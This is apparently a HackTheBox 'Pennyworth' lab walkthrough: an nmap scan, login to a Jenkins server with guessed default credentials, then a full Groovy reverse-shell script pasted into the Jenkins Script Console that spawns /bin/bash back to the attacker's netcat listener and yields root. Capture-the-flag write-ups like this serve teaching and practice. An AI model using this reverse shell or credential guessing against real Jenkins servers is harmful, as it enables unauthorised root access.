## Reconnaissance

Kicking off with a simple Nmap scan...

__Nmap Scan__
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/three]
└─$ sudo nmap -sC -sV -oN nmap.txt 10.129.36.207
[sudo] password for darshan:
Nmap scan report for 10.129.36.207
Host is up (0.31s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/21%OT=8080%CT=1%CU=37255%PV=Y%DS=2%DC=I%G=Y%TM=63CB9
OS:1D2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)O
OS:PS(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537S
OS:T11NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)E
OS:CN(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 21 02:18:42 2023 -- 1 IP address (1 host up) scanned in 55.12 seconds

```

Visiting the website on port 8080, I found a `Jenkins Login Page`. So I tried entering common username and password combination to see if I could bypass the login page (admin:password, admin:admin, root:root) 

![pw-1](https://user-images.githubusercontent.com/87711310/214796032-93ca6d38-a204-46a2-a785-9c97e41d7f52.png)

And luckily after a few tries I was able to login in using `root:password` as credentials.

![pw-2](https://user-images.githubusercontent.com/87711310/214796048-c2b27452-de0c-409b-b912-a447d33f1d6b.png)

After looking around the website for a while, we find this interesting section of the website:

![pw-3](https://user-images.githubusercontent.com/87711310/214796056-8e16f2f7-f140-4d4c-b1d9-1264b31523e5.png)

To get there, click on `Manage Jenkins` on the left pane, then scroll down all the way to the bottom of the page and click on `Script Console`. 

On Googling "Jenkins exploit" and I found this [link](https://github.com/gquere/pwn_jenkins) and scrolled down to the reverse shell from Groovy code:

```groovy
String host="my I>";
int port=8888;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Copy paste the code above to the Script Console section of the website. This should look something like this:

![pw-4](https://user-images.githubusercontent.com/87711310/214796061-b3f71ab8-e04b-44b4-b4af-ee355b82fe99.png)

Started a netcat listener on my machine
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/Pennyworth]
└─$ nc -lvnp 8888                              
listening on [any] 8888 ..
```

Now, I went back and ran the script from the Jenkins page.

And returning to my netcat, I got back a reverse shell.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/Pennyworth]
└─$ nc -lvnp 8888                              
listening on [any] 8888 ...
connect to [10.10.16.42] from (UNKNOWN) [10.129.36.207] 43016
whoami
root
```

Now that I had a root privileged reverse shell, I could retrieve the flag and complete the exercise.

```
cd root
ls  
flag.txt
snap
cat flag.txt
[REDACTED]
```

